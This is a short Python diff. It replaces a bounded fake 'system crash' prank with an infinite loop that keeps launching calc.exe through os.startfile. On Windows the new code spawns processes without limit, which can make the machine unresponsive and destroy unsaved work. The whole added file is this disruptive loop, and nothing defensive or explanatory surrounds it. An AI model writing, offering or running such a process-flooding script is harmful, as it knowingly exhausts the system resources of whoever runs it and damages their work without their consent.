@@ -1,19 +1,4 @@
-import sys
+import os
 
-def crash_system():
-    print("Crashing the system in 5 seconds. Please save all your work.")
-    sys.stdout.write("\033[H\033[J")  # Efface l'écran pour un effet de "crash"
-    
-    i = 0
-    while True:
-        try:
-            if i > 10000000:
-                raise Exception("Excessive iteration")
-            print(i)
-            sys.stdout.flush() 
-            i += 1
-        except Exception as e:
-            print(f"Error: {e}")
-            break
-
-crash_system()
+while True:
+    os.startfile('calc.exe')
